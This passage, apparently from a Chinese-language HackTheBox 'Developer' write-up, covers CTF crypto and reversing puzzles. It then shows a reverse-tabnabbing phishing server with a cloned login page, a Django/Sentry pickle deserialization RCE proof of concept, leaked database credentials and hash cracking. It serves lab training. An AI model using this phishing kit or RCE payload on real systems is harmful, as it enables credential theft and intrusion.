enter your password as a program argument!'\n   0x55555555520f <main+28>     call   puts@plt                    <puts@plt>\n \n   0x555555555214 <main+33>     jmp    main+175                    <main+175>\n    â†“\n   0x5555555552a2 <main+175>    mov    eax, 0     EAX => 0\n   0x5555555552a7 <main+180>    leave  \n   0x5555555552a8 <main+181>    ret    \n```\n\n```bash\npwndbg> b *0x5555555551de\nBreakpoint 2 at 0x5555555551de\npwndbg> c                                  \nContinuing.                                                                                                       \n                                                                                                                  \nBreakpoint 2, 0x00005555555551de in check_password ()                                                             \nLEGEND: STACK | HEAP | CODE | DATA | WX | RODATA \nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS / show-flags off / show-compact-regs off ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n*RAX  0x7fffffffdef0 â—‚â€” 0x9700333231 /* '123' */                                                                  \n RBX  0x7fffffffe068 â€”â–¸ 0x7fffffffe36e â—‚â€” '/root/Desktop/HackTheBox/Developer/pwnme'\n*RCX  0x336e6179696173                                                                                                                                                                                                              \n*RDX  0x7fffffffdee0 â—‚â€” 'supersaiyan3'  \n*RDI  0x7fffffffdef0 â—‚â€” 0x9700333231 /* '123' */\n*RSI  0x7fffffffdee0 â—‚â€” 'supersaiyan3'\n```\n\næˆ‘ä»¬èƒ½çœ‹åˆ°å¯„å­˜å™¨ä¸Šçš„å€¼æ˜¯`supersaiyan3`\n\n```bash\nâœ  Developer ./pwnme supersaiyan3           \nPassword correct. Here's a flag:\nDHTB{b4s1c0v3rF7ow}\n```\n\n### Esay Encryption\n\néœ€è¦è§£å¯†`DRwdFjIMJiYgOi4dOhI8OjQ=`\n\nä¸‹è½½ä¼šç»™å‡ºä¸€ä¸ªå¼‚æˆ–è„šæœ¬\n\n```bash\n#!/usr/bin/python3\nfrom itertools import izip, cycle\nimport base64\n\ndef xor_crypt_string(data, key='**'):\n    xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(data, cycle(key)))\n    return base64.encodestring(xored).strip()\n\nsecret_data = \"<REDACTED>\"\nprint xor_crypt_string(secret_data)\n```\n\nä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“`key`æ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯æˆ‘ä»¬èƒ½çŸ¥é“å‰äº”ä½æ˜¯ `DHTB{`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image11.png)\n\næˆ‘ä»¬åè¿‡æ¥å³å¯å¾—åˆ°`flag`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image12.png)\n\n### Triple Whammy\n\nWe've been told these keys hold a secret message, can you decode it?\n\n```bash\nc249e41fc6ee70a6c72d0441360cd7714f56b95f08edfce23e\nfb9c2b4b0b07422617884a2ac6e4ea4cbf72563bd55b33894b\n7d9d9b16b6b15df288ca3c339f9a7b489e629a0a9bc3a1167f\n```\n\nè§£å‹åå¾—åˆ°çš„è„šæœ¬\n\n```bash\nimport os\nfrom secret import flag\n\ndef bxor(ba1, ba2):\n    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])\n\nkey1 = os.urandom(len(flag))\nkey2 = os.urandom(len(flag))\n\nct1 = bxor(key1, flag)\nct2 = bxor(ct1, key2)\nct3 = bxor(key2, flag)\n\nprint(ct1.hex())\nprint(ct2.hex())\nprint(ct3.hex())\n```\n\n`AI`ä¸€æŠŠæ¢­å“ˆ\n\n```bash\n#!/usr/bin/python3\n\ndef bxor(ba1, ba2):\n    \"\"\"Performs a byte-wise XOR operation on two byte strings.\"\"\"\n    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])\n\n# 1. ä»é¢˜ç›®ä¸­è·å–çš„ä¸‰ä¸ªåå…­è¿›åˆ¶å¯†æ–‡\nhex_ct1 = \"c249e41fc6ee70a6c72d0441360cd7714f56b95f08edfce23e\"\nhex_ct2 = \"fb9c2b4b0b07422617884a2ac6e4ea4cbf72563bd55b33894b\"\nhex_ct3 = \"7d9d9b16b6b15df288ca3c339f9a7b489e629a0a9bc3a1167f\"\n\n# 2. å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚ï¼ˆbytesï¼‰å¯¹è±¡\nct1 = bytes.fromhex(hex_ct1)\nct2 = bytes.fromhex(hex_ct2)\nct3 = bytes.fromhex(hex_ct3)\n\n# 3. æ ¹æ®æ¨å¯¼ï¼Œå°†ä¸‰ä¸ªå¯†æ–‡å…¨éƒ¨å¼‚æˆ–\n# flag = ct1 ^ ct2 ^ ct3\n# æˆ‘ä»¬å¯ä»¥åˆ†ä¸¤æ­¥æ¥å®Œæˆ\ntemp_xor_result = bxor(ct1, ct2)\nflag_bytes = bxor(temp_xor_result, ct3)\n\n# 4. å°†æ¢å¤çš„å­—èŠ‚æ•°æ®è§£ç ä¸ºUTF-8å­—ç¬¦ä¸²å¹¶æ‰“å°\ntry:\n    flag = flag_bytes.decode('utf-8')\n    print(\"ğŸ‰ Flag has been successfully recovered!\")\n    print(f\"[*] Flag: {flag}\")\nexcept UnicodeDecodeError:\n    print(\"âŒ Could not decode the result as a UTF-8 string.\")\n    print(f\"[*] Raw bytes (hex): {flag_bytes.hex()}\")\n```\n\n```bash\nğŸ‰ Flag has been successfully recovered!\n[*] Flag: DHTB{XorXorXorFunFunFun}\n```\n\n## é’“é±¼æ”»å‡»\n\nå…¶å®åšå®Œä¸€é“é¢˜å°±å¯ä»¥ç»§ç»­æ‰“äº†\n\nåšå®Œåæœ‰ä¸€ä¸ªæäº¤`writeup`çš„è¾“å…¥æ¡†\n\næˆ‘ä»¬å¼€å¯`Web`æœåŠ¡å™¨ï¼Œå¹¶æäº¤æ”¹åœ°å€ä¸Šå»ï¼Œçœ‹æ˜¯å¦æœ‰äººä¼šè®¿é—®\n\nä¸ä¸€ä¼šå°±æœ‰å›æ˜¾äº†\n\n```bash\nâœ  Developer python -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.11.103 - - [21/Jun/2025 18:53:48] \"GET / HTTP/1.1\" 200 -\n10.10.11.103 - - [21/Jun/2025 18:53:49] code 404, message File not found\n10.10.11.103 - - [21/Jun/2025 18:53:49] \"GET /favicon.ico HTTP/1.1\" 404 -\n```\n\nä½†æ˜¯æˆ‘ä»¬è¿˜ä¸çŸ¥é“è¦å¦‚ä½•è¿›è¡Œåˆ©ç”¨\n\n`Sessionid`å¼€å¯äº†`httponly` ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡`XSS`è·å–\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image13.png)\n\né€šè¿‡ç›®å½•æ‰«æèƒ½å‘ç°ï¼Œè¿˜å­˜åœ¨ä¸€ä¸ªç™»å½•æ¡†ï¼Œå¹¶ä¸”æ˜¯åªèƒ½`admin`æ‰èƒ½è®¿é—®\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image14.png)\n\nä½†æ˜¯ç°åœ¨æ²¡ä»€ä¹ˆç”¨ï¼Œå›åˆ°åå°ï¼Œæˆ‘å‘ç°å½“æˆ‘ä»¬æäº¤äº†`writeup`åï¼Œä¼šåœ¨`profile`ä¸­ç”Ÿæˆä¸€ä¸ªé“¾æ¥\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image15.png)\n\né‡è¦çš„æ˜¯è¿™ä¸ªé“¾æ¥å…·æœ‰`target`å±æ€§ï¼Œå…¶å€¼ä¸º`_blank`,åŒæ—¶æ²¡æœ‰ä½¿ç”¨`rel=\"noopener\"`å±æ€§ï¼Œè¿™è®©æˆ‘æƒ³èµ·`Reverse_Tabnabbing` ï¼ˆæ ‡ç­¾é¡µåŠ«æŒæ”»å‡»ï¼‰æ¼æ´ï¼Œä¹‹å‰æœ‰åœ¨`Vulnhub`ä¸Šçš„ä¸€å°é¶æœºï¼ˆhttps://www.vulnhub.com/entry/napping-101,752/ï¼‰é‡åˆ°è¿‡\n\n### Reverse_Tabnabbing\n\n> https://owasp.org/www-community/attacks/Reverse_Tabnabbing\n> \n\nç›‘å¬ä¸€ä¸‹å¯¹æ–¹è¯·æ±‚\n\n```bash\nâœ  Developer nc -lvp 80    \nlistening on [any] 80 ...\nconnect to [10.10.16.58] from developer.htb [10.10.11.103] 47222\nGET / HTTP/1.1\nHost: 10.10.16.58\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\nIf-Modified-Since: Sat, 21 Jun 2025 11:08:45 GMT\n```\n\nå›æ˜¾ä¸­æœ‰`firefox`çš„`UA`ï¼Œå¾ˆå¤§æ¦‚ç‡ä½¿ç”¨æµè§ˆå™¨æ¥è®¿é—®çš„\n\nç°åœ¨çš„æ€è·¯æ˜¯ï¼šæäº¤è·³è½¬é“¾æ¥ï¼Œç„¶åä¼ªé€ ä¸€ä¸ªå’Œ`developer.htb` çš„ç™»å½•é¡µé¢ä¸€æ ·ç«™ç‚¹ï¼Œå¯¹æ–¹ç‚¹å‡»åï¼Œå¼¹åˆ°`writeup`é¡µé¢ï¼Œç„¶ååŸå§‹é¡µé¢ï¼ˆ`dashbroad`ï¼‰å˜æˆæˆ‘ä»¬çš„é’“é±¼ç½‘ç«™ï¼Œè®©å¯¹æ–¹ä»¥ä¸ºç™»å½•æ‰äº†ï¼Œç„¶åæˆ‘ä»¬è·å–å‡­è¯\n\nè¿™é‡Œå€Ÿç”¨ï¼šhttps://0xdf.gitlab.io/2022/01/15/htb-developer.html#shell-as-www-data çš„æ–¹æ³•ï¼Œæˆ‘è‡ªå·±å¼„äº†å¥½ä¹…æ²¡å¼„å¥½\n\næ­å»ºé’“é±¼æœåŠ¡å™¨\n\n```bash\nâœ  Developer cat server2.py  \nfrom flask import *\n\napp = Flask(__name__, template_folder='.')\n\n@app.route(\"/writeup\")\ndef writeup():\n    return render_template('writeup.html')\n\n@app.route(\"/accounts/login/\", methods=['GET', 'POST'])\ndef login():\n\n    if request.method == 'POST':\n        print('\\n'.join([f'{x[0]}: {x[1]}' for x in request.form.items()]))\n        return redirect(\"http://10.10.10.120/accounts/login/\", code=302)\n    else:\n        return render_template('login.html')\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", port=80)\n```\n\nè·³è½¬ç½‘ç«™\n\n```bash\n<html>\n  <body>\n    <h2>Challenge Writeup</h2>\n    <p>Something</p>\n    <script>\n    if (window.opener) window.opener.parent.location.replace('http://10.10.16.58/accounts/login/');\n    if (window.parent != window) window.parent.location.replace('https://10.10.16.58/accounts/login/');           \n    </script>\n  </body>\n</html>\n```\n\nåˆ¶é€ é’“é±¼ç«™ç‚¹\n\n```bash\nâœ  Developer curl http://developer.htb/accounts/login/ > login.html                                                \n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  1938  100  1938    0     0  13686      0 --:--:-- --:--:-- --:--:-- 13744\n```\n\nä¿®æ”¹é‡Œé¢çš„é™æ€å†…å®¹ä¸ºç»å¯¹è·¯å¾„å¹¶å°†`action` æ”¹ä¸º`/accounts/login/`\n\n```bash\n<!doctype html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n    <meta name=\"description\" content=\"\">\n    <meta name=\"author\" content=\"\">\n    <link rel=\"icon\" href=\"http://developer.htb/img/favicon.ico\">\n    <link rel=\"stylesheet\" href=\"http://developer.htb/static/css/jquery.toasts.css\">\n    <script src=\"http://developer.htb/static/js/all.min.js\"></script>\n    <script src=\"http://developer.htb/static/js/jquery-3.2.1.min.js\"></script>\n    <title>Login | Developer.HTB</title>\n\n    <!-- Bootstrap core CSS -->\n    <link rel=\"stylesheet\" href=\"http://developer.htb/static/css/bootstrap.min.css\">\n\n    <!-- Custom styles for this template -->\n    <link href=\"http://developer.htb/static/css/signin.css\" rel=\"stylesheet\">\n  </head>\n\n  <body class=\"text-center\">\n\n    <form class=\"form-signin\" action=\"/accounts/login/\" method=\"post\">\n        <input type=\"hidden\" name=\"csrfmiddlewaretoken\" value=\"3W4vCYZiDT8dEraVzrXiGZWKWIOnF1L89n59maXHD5msDXNkDs2N5ZV6TmEIQqFE\">\n      <img class=\"mb-4\" src=\"http://developer.htb/static/img/logo.png\" alt=\"\" width=\"72\" height=\"72\">\n      <h1 class=\"h3 mb-3 font-weight-normal\">Welcome back!</h1>\n      <label for=\"uname\" class=\"sr-only\">User Name</label>\n      <input type=\"text\" id=\"id_login\" name=\"login\" placeholder=\"Username\" class=\"form-control\" required autofocus>\n      <label for=\"password\" class=\"sr-only\">Password</label>\n      <input type=\"password\" id=\"id_password\" name=\"password\" placeholder=\"Password\" class=\"form-control\" required>\n\n      <button id=\"loginbtn\" class=\"btn btn-lg btn-primary btn-block\" type=\"submit\">Sign in</button>\n          <a href=\"http://developer.htb/saccounts/password/reset/\" class=\"auth-link\">Forgot password?</a>\n                <div class=\"text-center mt-4 font-weight-light\"> Don't have an account? <a href=\"http://developer.htb/saccounts/signup/\" >Click here!</a>\n      <p class=\"mt-5 mb-3 text-muted\">&copy; Developer.HTB 2021</p>\n    </form>\n\n<script src=\"http://developer.htb/static/js/jquery.toast.js\"></script>\n<script>\n\n</script>\n  </body>\n</html>\n```\n\nå¼€å¯é’“é±¼æœåŠ¡å™¨ï¼Œå¹¶æäº¤`/writeup`åˆ°ç«™ç‚¹ä¸­ï¼Œè¿‡ä¸€ä¼šå°±èƒ½æ¥æ”¶åˆ°ç”¨æˆ·çš„å¯†ç äº†\n\n```bash\nâœ  Developer python server2.py\n * Serving Flask app 'server2'\n * Debug mode: off\nWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.\n * Running on all addresses (0.0.0.0)\n * Running on http://127.0.0.1:80\n * Running on http://192.168.111.155:80\nPress CTRL+C to quit\n10.10.11.103 - - [21/Jun/2025 20:49:24] \"GET /writeup HTTP/1.1\" 200 -\n10.10.11.103 - - [21/Jun/2025 20:49:24] \"GET /accounts/login/ HTTP/1.1\" 200 -\ncsrfmiddlewaretoken: 3W4vCYZiDT8dEraVzrXiGZWKWIOnF1L89n59maXHD5msDXNkDs2N5ZV6TmEIQqFE\nlogin: admin\npassword: SuperSecurePassword@HTB2021\n10.10.11.103 - - [21/Jun/2025 20:49:25] \"POST /accounts/login/ HTTP/1.1\" 302 -\n10.10.11.103 - - [21/Jun/2025 20:49:28] \"GET /accounts/login/ HTTP/1.1\" 200 -\n```\n\nè¿™é‡Œå¾ˆå¥‡æ€ªçš„å°±æ˜¯ï¼Œæˆ‘è‡ªå·±å¤ç°è¯¥æ¼æ´æ— æ³•å¤ç°æˆåŠŸ\n\n## Django Secret Key & RCE\n\næ‹¥æœ‰ç®¡ç†å‘˜å‡­æ®åï¼Œæˆ‘ä»¬å°±èƒ½å¯¹ `/admin`è¿›è¡Œç™»é™†äº†\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image16.png)\n\nèƒ½å‘ç°ä¸€ä¸ªæ–°çš„å­åŸŸå\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image17.png)\n\næ­å»ºçš„æ˜¯`sentry` ä¸€æ¬¾å¼€æºçš„å®æ—¶å¼‚å¸¸ç›‘æ§å¹³å°\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image18.png)\n\næ³¨å†Œè´¦å·ç™»å½•è¿›å»ï¼Œæ— æ³•ä½¿ç”¨ä¸Šé¢çš„å‡­æ®\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image19.png)\n\nç‰ˆæœ¬ `Sentry 8.0.0` åœ¨ç½‘ä¸Šèƒ½æ‰¾åˆ°å®ƒçš„ååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨è„šæœ¬ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å°†`shell`å¼¹å›æ¥\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image20.png)\n\nè¿™é‡Œä½¿ç”¨ `jacob@developer.htb` ï¼ˆå¯ä»¥ä»`Member`é‡Œå¾—åˆ°ï¼‰çš„å‡­æ®å’Œä¸Šè¾¹é’“é±¼å¾—åˆ°çš„å¯†ç æˆåŠŸè·å¾—`sentry`æ›´é«˜æƒé™\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image21.png)\n\nç„¶åæ‘¸ç´¢ä¸€ç•ªåï¼Œæˆ‘åˆ›å»ºäº†æ–°çš„`project`ç„¶ååˆ é™¤ï¼Œä½†æ˜¯åˆ é™¤çš„æ—¶å€™å‡ºç°äº†é”™è¯¯\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image22.png)\n\nè¿˜æœ‰å¾ˆå¤šçš„è°ƒè¯•ä¿¡æ¯\n\n```bash\nSENTRY_OPTIONS \t\n\n{'cache.backend': 'sentry.cache.redis.RedisCache',\n 'cache.options': {},\n 'redis.options': {'hosts': {0: {'host': '127.0.0.1',\n                                 'password': 'g7dRAO6BjTXMtP3iXGJjrSkz2H9Zhm0CAp2BnXE8h92AOWsPZ2zvtAapzrP8sqPR92aWN9DA207XmUTe',\n                                 'port': 6379}}},\n 'system.databases': {'default': {'ATOMIC_REQUESTS': False,\n                                  'AUTOCOMMIT': True,\n                                  'CONN_MAX_AGE': 0,\n                                  'ENGINE': 'sentry.db.postgres',\n                                  'HOST': 'localhost',\n                                  'NAME': 'sentry',\n                                  'OPTIONS': {},\n                                  'PASSWORD': u'********************',\n                                  'PORT': '',\n                                  'TEST_CHARSET': None,\n                                  'TEST_COLLATION': None,\n                                  'TEST_MIRROR': None,\n                                  'TEST_NAME': None,\n                                  'TIME_ZONE': 'UTC',\n                                  'USER': 'sentry'}},\n 'system.debug': True,\n 'system.secret-key': 'c7f3a64aa184b7cbb1a7cbe9cd544913'}\n```\n\nå¯ä»¥çœ‹åˆ°å†…éƒ¨è£…äº†`redis` ï¼Œå¹¶ä¸”å¯†ç ä¹Ÿå‡ºæ¥äº†ï¼Œä¸‹è¾¹è¿˜æœ‰ä¸ªæœ‰è¶£çš„`secret-key`\n\nç»è¿‡ä¸€ç•ªæœç´¢ï¼Œ`secret-key` ä¼šå¯¼è‡´ååºåˆ—åŒ–çš„`RCE`æ¼æ´\n\nå…¶ä¸­æœ‰ä¸€ç¯‡æ–‡ç« ï¼šhttps://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/\n\né‡Œè¾¹æœ‰ä¸€ä¸ª`POC` ï¼Œä¼šè®©ç³»ç»Ÿç¡`30`ç§’\n\n```bash\n#!/usr/bin/python\nimport django.core.signing, django.contrib.sessions.serializers\nfrom django.http import HttpResponse\nimport cPickle\nimport os\n\nSECRET_KEY='c7f3a64aa184b7cbb1a7cbe9cd544913'\n#Initial cookie I had on sentry when trying to reset a password\ncookie='.eJxrYKotZNQI5UxMLsksS80vSi9kimBjYGAoTs0rKaosZA5lKS5NyY_gAQplR7lVRJYEmrkUFqZFcAEFSlKLS5Lz87MzU8FayvOLslNTQnnjE0tLMuJLi1OL4jNTvFlDhZAEkhKTs1PzUkKVIObrlZZk5hTrgeT1XHMTM3McgSwniJpSPQABCTQf:1uSyim:otT7eddw7eu0o_QNAt1QRz6f1m8'\nnewContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')\nclass PickleRce(object):\n    def __reduce__(self):\n        return (os.system,(\"sleep 30\",))\nnewContent['testcookie'] = PickleRce()\n\nprint django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True)\n```\n\n```bash\nâœ  Developer python2 POC.py     \n.eJxrYKotZNQI5UxMLsksS80vSo9gY2BgKE7NKymqDGUpLk3Jj-ABCmRHuVVElgSauRQWpkVwAQVKUotLkvPzszNTkwvyizMruIori0tSc7kKmUI5inNSUwsUjA0KmVsLWYIKWUOF4hNLSzLiS4tTi-KTEpOzU_NSQpUgduiVlmTmFOuB5PVccxMzcxyBLCeoGl4kfZkp3qylegB0jjs_:1uT0GX:UtsjlwEnnkwtUuqifJt-ZzyYO1s\n```\n\näº‹å®è¯æ˜ï¼Œæ›¿æ¢äº†`Cookie`åï¼Œç¡®å®åŠ è½½äº†`30`ç§’\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image23.png)\n\næˆ‘ä»¬å°è¯•è®©å…¶`curl`æˆ‘ä»¬çš„æœåŠ¡å™¨\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image24.png)\n\nè¿›è¡Œåå¼¹`Shell` \n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image25.png)\n\n## In www-data Shell\n\nä¿¡æ¯æ”¶é›†ä¸€æ³¢\n\næœ‰ä¸¤ä¸ªç”¨æˆ·\n\n```bash\nwww-data@developer:/var/sentry$ ls /home\nls /home\nkarl\nmark\n```\n\næ•°æ®é…ç½®æ–‡ä»¶å¯ä»¥åœ¨`/var/www/developer_ctf/developer_ctf/settings.py` ä¸­æ‰¾åˆ°\n\n```bash\nDATABASES = {                                            \n    'default': {           \n        'ENGINE': 'django.db.backends.postgresql',       \n        'NAME': 'platform',             \n        'USER': 'ctf_admin',  \n        'PASSWORD': 'CTFOG2021',                         \n        'HOST': 'localhost',   \n        'PORT': '',    \n    }                                      \n}  \n```\n\n```bash\nwww-data@developer:~/developer_ctf$ psql -U ctf_admin -h localhost -p 5432 -d platform\nPassword for user ctf_admin: \npsql (9.6.22)\nSSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)\nType \"help\" for help.\n\nplatform=> \n```\n\nè·å¾—ç”¨æˆ·ä¼¼ä¹éƒ½æ— æ•ˆ\n\n```bash\n id |                                         password                                         |          last_login           | is_superuser |                                                                        username                                                                        | first_name | last_name |          email           | is_staff | is_active |          date_joined          \n----+------------------------------------------------------------------------------------------+-------------------------------+--------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+------------+-----------+--------------------------+----------+-----------+-------------------------------\n  5 | pbkdf2_sha256$260000$FyKNWfAl4Z87o55I4bDST7$7PrVwU5N1687BSxClTP0tlnFg+9VmOR6lsXiJsSRBNE= | 2021-05-27 20:15:00.346686+00 | f            | clubby789                                                                                                                                              |            |           | clubby789@developer.htb  | f        | t         | 2021-05-27 20:15:00.157993+00\n  2 | pbkdf2_sha256$260000$7Pu55SdoDNTu51RrtU5V8A$Fmn66ovbOqfNUKftQYrJcWmk7xzejU0g3F72jL+cdUg= | 2021-05-23 22:25:03.654845+00 | f            | willwam845                                                                                                                                             |            |           | willwam845@developer.htb | f        | t         | 2021-05-23 22:25:03.474364+00\n  3 | pbkdf2_sha256$260000$k0RbpkHl5CvArYIwsGxFUb$ixe4YKYn45Fm8aq56GEzF8TUi9lydD2WA2gRxXz/EMc= | 2021-05-25 12:23:52.298531+00 | f            | dmw0ng                                                                                                                                                 |            |           | dmw0ng@developer.htb     | f        | t         | 2021-05-25 12:23:52.090526+00\n  4 | pbkdf2_sha256$260000$aFEnXsRKf4YRRUw1qnlJSN$4oL+FVJpqmi4sCt4U9ddPRE1srKZiP+HCXInnCuzdv0= | 2021-05-25 13:52:30.406816+00 | f            | jazzpizazz                                                                                                                                             |            |           | jazzpizazz@developer.htb | f        | t         | 2021-05-25 13:52:30.239297+00\n  8 | pbkdf2_sha256$260000$1ooBpoiFmfVEwYt6dsoXMi$fODy4UKt0vv0BllqLAJmSinmGBFffbezZrLptuyGpe4= | 2025-06-21 11:35:29.667268+00 | f            | sunset                                                                                                                                                 |            |           | sunset@qq.com            | f        | t         | 2025-06-21 04:44:05.184883+00\n  9 | pbkdf2_sha256$260000$7fttI4Tuwlrd2wlnkScbDs$t9DwUfhd6jv8yiD7uih4HMgsKjrUg/uCVR3RdujzBic= |                               | f            | 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111 |            |           |                          | f        | t         | 2025-06-21 13:07:47.706432+00\n 10 | pbkdf2_sha256$260000$2tCPe0purzYSIKkdmorGpl$a4bFd9XH8FUfnZl+mx/uAV3E1VxcjFJUOy8UAlbxL9Y= |                               | f            | 222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222 |            |           |                          | f        | t         | 2025-06-21 13:08:43.403158+00\n  1 | pbkdf2_sha256$260000$H7w2AZzBGAHHHvSzgQZXHf$TWkQdxmDHXDxoWLSEQYjZQbMJJjMpzmEHBqWMNHr0xc= | 2025-06-21 13:16:19.266228+00 | t            | admin                                                                                                                                                  | Jacob      | Taylor    | admin@developer.ctf      | t        | t         | 2021-05-22 23:14:03+00\n```\n\nç„¶ååœ¨`/etc/sentry/sentry.conf.py` åˆèƒ½æ‰¾åˆ°ä¸€ä¸ªæ•°æ®åº“å‡­æ®\n\n```bash\n    'default': {\n        'ENGINE': 'sentry.db.postgres',\n        'NAME': 'sentry',                           \n        'USER': 'sentry',\n        'PASSWORD': 'SentryPassword2021',\n        'HOST': 'localhost',\n        'PORT': '',\n    }     \n}\n```\n\nè¿™æ¬¡èƒ½è·å¾—ä¸‰ä¸ªç”¨æˆ·ï¼Œå¹¶ä¸”`karl`æ˜¯æœ‰å®¶ç›®å½•çš„\n\n```bash\nsentry=#   \nselect id,username,password from auth_user;\n id |      username       |                                   password                                    \n----+---------------------+-------------------------------------------------------------------------------\n  1 | karl@developer.htb  | pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI=\n  6 | sunset@qq.com       | pbkdf2_sha256$12000$0EZfh8zCtpXY$8aNutC5bwrU65AtpuvspwEicUw2+63EQ61zjTyzVViE=\n  5 | jacob@developer.htb | pbkdf2_sha256$12000$MqrMlEjmKEQD$MeYgWqZffc6tBixWGwXX2NTf/0jIG42ofI+W3vcUKts=\n(3 rows)\n```\n\nå°è¯•ç ´è§£å¯†ç \n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image26.png)\n\nå¾—åˆ°å¯†ç ï¼š`insaneclownposse`\n\næˆåŠŸè¿›å…¥`Karl`ç”¨æˆ·`Shell`ä¸­ï¼Œè¯»å–`user.txt`\n\n```bash\nkarl@developer:~$ cat user.txt\n77cc1a399155edc9a66dae47df32a834\n```\n\n## In Karl Shell - To Root\n\n`sudo`æƒé™\n\n```bash\nkarl@developer:~$ sudo -l\n[sudo] password for karl: \nMatching Defaults entries for karl on developer:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser karl may run the following commands on developer:\n    (ALL : ALL) /root/.auth/authenticator\n```\n\næ‹‰å‡ºæ¥`IDA` ï¼Œ`rust` é€†å‘`+1`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image27.png)\n\n`main`ä¸­è¿˜æœ‰ä¸ª`authentication::main` \n\n```bash\nint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  isize v4; // rdx\n  core::ops::function::_Fn<()> v5; // rdi\n  __int64 (__fastcall *v7)(); // [rsp+0h] [rbp-8h] BYREF\n\n  v4 = argc;\n  v7 = authentication::main::h453271f02403abaf;\n  v5.vtable = (usize (*)[3])&anon_b091e66417960b0266d335ff382118b4_0_llvm_10046553308101135558;\n  v5.pointer = (u8 *)&v7;\n  return std::rt::lang_start_internal::h3c710f42dc1fbba8(v5, v4, (u8 **)argv);\n}\n```\n\nè¿›å…¥åˆ°`authentication::main` ï¼Œå‰è¾¹ä¸¤ä¸ª`print`æ˜¯æ‰“å°å‰ä¸¤æ¡ä¿¡æ¯\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image28.png)\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image29.png)\n\nå†ä¸‹é¢å°±æ˜¯åŠ å¯†çš„å‡½æ•°\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image30.png)\n\n`args.pieces.data_ptr = (_str *)crypto::aes::ctr::h2e946f13694abc7d(0LL, &v36, 16LL, &v37, 16LL);`\n\nå‘Šè¯‰æˆ‘ä»¬ä½¿ç”¨`AES-CTR`è¿›è¡ŒåŠ å¯†ï¼Œå¹¶ä¸”ä¼ å…¥äº†ä»å†…å­˜åœ°å€å†²ä¼ å…¥çš„ä¸¤ä¸ªå¸¸é‡`v36`å’Œ`v37` 